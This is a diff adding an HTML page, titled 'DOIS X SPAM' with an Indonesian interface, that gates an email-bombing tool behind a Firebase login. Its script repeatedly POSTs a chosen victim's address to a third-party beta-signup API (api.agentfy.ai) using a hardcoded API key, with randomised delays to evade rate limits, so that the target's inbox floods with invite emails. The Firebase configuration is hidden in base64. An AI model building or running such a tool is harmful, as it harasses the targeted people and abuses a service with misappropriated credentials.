@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>DOIS X SPAM</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box;}
+    body{background:#0a0a0a;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;color:#fff;flex-direction:column;gap:20px;}
+    .card{background:#1a1a1a;padding:40px;border-radius:20px;border:1px solid #ff1493;text-align:center;width:400px;max-width:94%;}
+    input,button{width:100%;padding:14px;margin:8px 0;border-radius:10px;border:none;font-size:16px;}
+    input{background:#111;color:#fff;border:1px solid #333;outline:none;transition:all 0.3s cubic-bezier(0.25,0.1,0.25,1);}
+    input:focus{border-color:#ff1493;background:#1a1a1a;box-shadow:0 0 0 3px rgba(255,20,147,0.3);transform:scale(1.02);}
+    input:active{transform:scale(0.98);border-color:#007aff;}
+    input::placeholder{color:#666;}
+    button{background:#ff1493;color:#fff;font-weight:bold;cursor:pointer;transition:0.2s;}
+    button:hover{background:#ff69b4;}
+    #msg{color:#ff4444;min-height:24px;}
+    .hidden{display:none !important;}
+    .input-row{display:flex;gap:10px;}
+    .input-row input{flex:1;}
+    #log{text-align:left;font-size:12px;color:#666;max-height:150px;overflow-y:auto;margin-top:10px;background:#111;padding:10px;border-radius:8px;}
+    .log-success{color:#00ff88;}
+    .log-error{color:#ff4444;}
+    .log-warning{color:#ffaa00;}
+    #status{color:#888;margin-top:10px;}
+    #counter{color:#555;margin-top:8px;}
+    .btn-logout{background:#333;margin-top:10px;}
+    .btn-logout:hover{background:#555;}
+  </style>
+</head>
+<body>
+
+<div class="card" id="loginCard">
+  <h1 style="color:#ff1493;font-size:32px;">DOIS X SPAM</h1>
+  <p style="color:#666;">Login dengan Firebase</p>
+  <input type="email" id="emailInput" placeholder="Email..." value="" />
+  <input type="password" id="passwordInput" placeholder="Password..." />
+  <button onclick="login()">Login</button>
+  <div id="msg"></div>
+  <button onclick="register()" style="background:#333;margin-top:5px;">Buat Akun Baru</button>
+</div>
+
+<div class="card hidden" id="spamCard">
+  <h1 style="color:#ff1493;font-size:32px;">DOIS X SPAM</h1>
+  <p style="color:#666;">Mode Spam Aktif</p>
+  <input type="email" id="email" placeholder="Email Target" value="" />
+  <div class="input-row">
+    <input type="number" id="jumlah" value="25" placeholder="Jumlah" />
+    <input type="number" id="delay" value="1500" placeholder="Delay" />
+  </div>
+  <button onclick="spam()">Kirim Spam</button>
+  <div id="status">Siap</div>
+  <div id="log"></div>
+  <div id="counter">0 / 0</div>
+  <button onclick="logout()" class="btn-logout">Logout</button>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/12.15.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/12.15.0/firebase-auth-compat.js"></script>
+
+<script>
+  var _cfg = "eyJhcGlLZXkiOiJBSXphU3lDc1liRTFVa2NsaTZBUEhhUkdhWkRhWjVOTkFZV0NfUlEiLCJhdXRoRG9tYWluIjoiZG9pc3gtZGMyM2IuZmlyZWJhc2VhcHAuY29tIiwiZGF0YWJhc2VVUkwiOiJodHRwczovL2RvaXN4LWRjMjNiLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbSIsInByb2plY3RJZCI6ImRvaXN4LWRjMjNiIiwic3RvcmFnZUJ1Y2tldCI6ImRvaXN4LWRjMjNiLmZpcmViYXNlc3RvcmFnZS5hcHAiLCJtZXNzYWdpbmdTZW5kZXJJZCI6IjYzNjM4MTI5NDc4OSIsImFwcElkIjoiMTo2MzYzODEyOTQ3ODk6d2ViOjllY2NmN2YzMGIxOTFjOGUxNjQwYWMiLCJtZWFzdXJlbWVudElkIjoiRy1MOFBIUjRFUzFEIn0=";
+  var firebaseConfig = JSON.parse(atob(_cfg));
+
+  firebase.initializeApp(firebaseConfig);
+  var auth = firebase.auth();
+
+  auth.signOut();
+
+  function login() {
+    var email = document.getElementById('emailInput').value;
+    var pwd = document.getElementById('passwordInput').value;
+    var msg = document.getElementById('msg');
+
+    auth.signInWithEmailAndPassword(email, pwd)
+      .then(function() {
+        document.getElementById('loginCard').classList.add('hidden');
+        document.getElementById('spamCard').classList.remove('hidden');
+        msg.textContent = '';
+      })
+      .catch(function(err) {
+        msg.textContent = 'Login gagal: ' + err.message;
+      });
+  }
+
+  function register() {
+    var email = document.getElementById('emailInput').value;
+    var pwd = document.getElementById('passwordInput').value;
+    var msg = document.getElementById('msg');
+
+    auth.createUserWithEmailAndPassword(email, pwd)
+      .then(function() {
+        msg.textContent = 'Akun berhasil dibuat! Sekarang login.';
+      })
+      .catch(function(err) {
+        msg.textContent = 'Gagal buat akun: ' + err.message;
+      });
+  }
+
+  function logout() {
+    auth.signOut();
+    document.getElementById('spamCard').classList.add('hidden');
+    document.getElementById('loginCard').classList.remove('hidden');
+  }
+
+  async function spam() {
+    var email = document.getElementById('email').value;
+    var total = parseInt(document.getElementById('jumlah').value) || 25;
+    var delayMs = parseInt(document.getElementById('delay').value) || 1500;
+    var status = document.getElementById('status');
+    var log = document.getElementById('log');
+    var counter = document.getElementById('counter');
+
+    if (!email || !email.includes('@')) {
+      status.textContent = 'Email target tidak valid!';
+      return;
+    }
+
+    log.innerHTML = '';
+    status.textContent = 'Mengirim...';
+    var success = 0, failed = 0;
+
+    var url = 'https://api.agentfy.ai/v1/beta';
+    var headers = {
+      'Accept': 'application/json',
+      'Content-Type': 'application/json',
+      'api-key': 'secret-a9387bc0-ff57-4d94-957d-fe2e44e06412',
+      'agent-id': 'agent-6c5d5cbf-f100-43d9-b1f0-862dc3d578a2'
+    };
+
+    for (var i = 0; i < total; i++) {
+      try {
+        var resp = await fetch(url, {
+          method: 'POST',
+          headers: headers,
+          body: JSON.stringify({ name: email, email: email, website: 'https://google.com', company: 'bisnis', role: 'member' })
+        });
+        if (resp.status === 201) {
+          success++;
+          log.innerHTML += '<div class="log-success">[' + (i+1) + '] Beta invite terkirim</div>';
+        } else {
+          failed++;
+          log.innerHTML += '<div class="log-error">[' + (i+1) + '] ' + resp.status + '</div>';
+        }
+      } catch (e) {
+        failed++;
+        log.innerHTML += '<div class="log-warning">[' + (i+1) + '] Error</div>';
+      }
+      status.textContent = (i+1) + '/' + total + ' | ' + success + ' | ' + failed;
+      counter.textContent = success + '  ' + failed + '  ' + (i+1) + '/' + total;
+      await new Promise(function(r) { setTimeout(r, delayMs * (0.7 + Math.random() * 0.6)); });
+      log.scrollTop = log.scrollHeight;
+    }
+
+    status.textContent = success > 0 ? 'Selesai! ' + success + ' berhasil ke ' + email : 'Gagal! ' + failed + '/' + total;
+  }
+
+  auth.onAuthStateChanged(function(user) {
+    if (user) {
+      document.getElementById('loginCard').classList.add('hidden');
+      document.getElementById('spamCard').classList.remove('hidden');
+    } else {
+      document.getElementById('spamCard').classList.add('hidden');
+      document.getElementById('loginCard').classList.remove('hidden');
+    }
+  });
+</script>
+</body>
+</html>
